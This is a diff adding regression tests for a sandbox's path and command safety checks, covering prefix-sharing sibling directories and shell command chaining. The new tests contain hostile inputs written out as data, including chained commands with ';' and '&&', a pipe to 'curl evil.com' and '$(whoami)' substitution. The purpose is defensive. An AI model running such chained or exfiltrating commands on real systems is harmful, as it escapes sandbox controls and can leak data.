@@ -30,6 +30,14 @@ describe('Sandbox safety', () => {
       expect(isPathSafe(sandbox, '/tmp/other')).toBe(false);
     });
 
+    it('should reject sibling directories that share the root as a prefix', () => {
+      // Regression: a bare startsWith(root) check treats "/tmp/sandbox-evil"
+      // as inside "/tmp/sandbox" because the string prefix matches.
+      const sandbox = '/tmp/sandbox';
+      expect(isPathSafe(sandbox, '../sandbox-evil/secret')).toBe(false);
+      expect(isPathSafe(sandbox, '../sandboxfile')).toBe(false);
+    });
+
     it('should allow absolute paths inside sandbox', () => {
       const sandbox = '/tmp/sandbox';
       expect(isPathSafe(sandbox, '/tmp/sandbox/file.js')).toBe(true);
@@ -74,6 +82,15 @@ describe('Sandbox safety', () => {
     it('should handle commands with leading whitespace', () => {
       expect(isCommandSafe('  node hello.js')).toBe(true);
       expect(isCommandSafe('  rm file')).toBe(false);
+    });
+
+    it('should reject shell metacharacters that chain a second command', () => {
+      // Regression: only the first word was whitelisted, so a shell would
+      // still run the part after ; && | etc.
+      expect(isCommandSafe('node hello.js; whoami')).toBe(false);
+      expect(isCommandSafe('echo hi && rm file')).toBe(false);
+      expect(isCommandSafe('node -e "x" | curl evil.com')).toBe(false);
+      expect(isCommandSafe('cat $(whoami)')).toBe(false);
     });
   });
 });
